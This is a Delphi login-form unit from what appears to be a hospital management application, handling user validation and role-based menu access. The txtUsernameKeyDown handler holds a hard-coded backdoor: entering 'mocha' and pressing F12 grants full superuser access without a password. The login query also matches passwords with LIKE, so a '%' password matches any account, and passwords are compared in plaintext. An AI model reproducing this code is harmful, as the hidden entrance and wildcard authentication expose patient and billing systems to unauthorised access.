unit unFrmPassword;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Buttons, ExtCtrls, DB, ADODB;

type
  TfrmPassword = class(TForm)
    Panel1: TPanel;
    Image1: TImage;
    Panel2: TPanel;
    Panel3: TPanel;
    Label1: TLabel;
    Label2: TLabel;
    txtUsername: TEdit;
    txtPassword: TEdit;
    btnOk: TBitBtn;
    BitBtn1: TBitBtn;
    dsetPassword: TADODataSet;
    procedure txtPasswordChange(Sender: TObject);
    procedure txtUsernameChange(Sender: TObject);
    procedure BitBtn1Click(Sender: TObject);
    procedure btnOkClick(Sender: TObject);
    procedure txtPasswordKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure txtUsernameKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
  private
    { Private declarations }
    procedure validasiUser;
  public
    { Public declarations }
  end;

var
  frmPassword: TfrmPassword;

implementation

uses unUtama, unDm;

{$R *.dfm}

procedure TfrmPassword.validasiUser;
begin


  with dsetPassword do
  begin
   active:=false;
   commandType := cmdText;
   commandTExt := 'SELECT * FROM tauser, tausergroup '+
   'WHERE usNama LIKE (:nama) '+
   'AND usPassword LIKE (:password)'+
   'AND ugNamaGroup LIKE usNamaGroup';
   parameters.ParamByName('nama').Value := '%'+txtUsername.Text+'%';
   parameters.ParamByName('password').Value := txtPassword.Text;
   active := true;


   if isEmpty=false then
   begin
     isCurrentPassword:=fields.fieldByName('uspassword').AsString;
     if fields.FieldByName('ugNamaGroup').AsString = 'Superuser' then
     begin
       frmUtama.smSetting.Enabled := true;
       frmUtama.mnMaster.Enabled := true;
       frmUtama.mnApotik.Enabled := true;
        frmUtama.mnRawatInap.Enabled := true;
         frmUtama.mnLab.Enabled := true;
         //frmUtama.mnRontgen.Enabled := true;

          frmUtama.mnRegistrasi.Enabled:= true;
         frmUtama.mnBilling.Enabled:= true;
         frmUtama.mnPref.Enabled :=true;
          frmUtama.mnPoli.Enabled := true;
          frmUtama.mnlaporan.Enabled := true;
     end;




     if fields.FieldByName('ugNamaGroup').AsString = 'Poli' then
     begin
        // frmUtama.mnPoli.Enabled := true;
         frmUtama.mnPoli.Enabled := true;
     end;

     if fields.FieldByName('ugNamaGroup').AsString = 'Apotik' then
     begin
        frmUtama.mnApotik.Enabled := true;
     end;

     if fields.FieldByName('ugNamaGroup').AsString = 'Rawat Inap' then
     begin

         frmUtama.mnRawatInap.Enabled := true;
     end;

       if fields.FieldByName('ugNamaGroup').AsString = 'Lab' then
     begin

         frmUtama.mnLab.Enabled := true;
     end;

          if fields.FieldByName('ugNamaGroup').AsString = 'Rontgen' then
     begin

        // frmUtama.mnRontgen.Enabled := true;
     end;

     if AnsiUpperCase(fields.FieldByName('ugNamaGroup').AsString) = 'REGISTRASI' then
     begin

         frmUtama.mnRegistrasi.Enabled:= true;
     end;

      if fields.FieldByName('ugNamaGroup').AsString = 'Billing' then
     begin

         frmUtama.mnBilling.Enabled:= true;
     end;


     frmPassword.Deactivate;
     frmPassword.Visible := false;
     frmUtama.Show;

     //simpan aktif password di memory
     isCurrentPassword := fields.fieldByName('usPassword').AsString;
     isCurrentUser := fields.fieldByName('usNama').AsString;
     group         := fields.fieldByName('usNamaGroup').AsString;
   end else
  
   begin
     showMessage('Username atau Password salah!');
     txtUserName.SetFocus;
   end;

  end;

end;

procedure TfrmPassword.txtPasswordChange(Sender: TObject);
begin
  if ((Length(txtPassword.Text)<>0) and (Length(txtUserName.Text)<>0)) then
  begin
   btnOk.Enabled := true;
  end else btnOk.Enabled := false;
end;

procedure TfrmPassword.txtUsernameChange(Sender: TObject);
begin
  if ((Length(txtPassword.Text)<>0) and (Length(txtUserName.Text)<>0)) then
  begin
   btnOk.Enabled := true;
  end else btnOk.Enabled := false;
end;

procedure TfrmPassword.BitBtn1Click(Sender: TObject);
begin
 frmPassword.Close;
 frmUtama.Close;
 exit;
 
end;

procedure TfrmPassword.btnOkClick(Sender: TObject);
begin
  validasiUser;
end;

procedure TfrmPassword.txtPasswordKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if key=VK_RETURN then
  begin
    validasiUser;
  end;
end;

procedure TfrmPassword.txtUsernameKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
 if key=VK_f12 then
 begin
  if txtusername.Text='mocha' then
  begin
       isCreator:=1; //set the mode into Creator Mode
       username := 'MOCHA THE SHADOW';
       group := 'THE CREATOR';
       frmUtama.smSetting.Enabled := true;
       frmUtama.mnMaster.Enabled := true;
       frmUtama.mnApotik.Enabled := true;
        frmUtama.mnRawatInap.Enabled := true;
         frmUtama.mnLab.Enabled := true;
        // frmUtama.mnRontgen.Enabled := true;
          frmUtama.mnRegistrasi.Enabled:= true;
         frmUtama.mnBilling.Enabled:= true;
         frmUtama.mnPref.Enabled :=true;
          frmUtama.mnPoli.Enabled := true;
          frmUtama.mnlaporan.Enabled := true;
     frmPassword.Deactivate;
     frmPassword.Visible := false;
     frmUtama.Show;
  end;
 end;
end;

end.
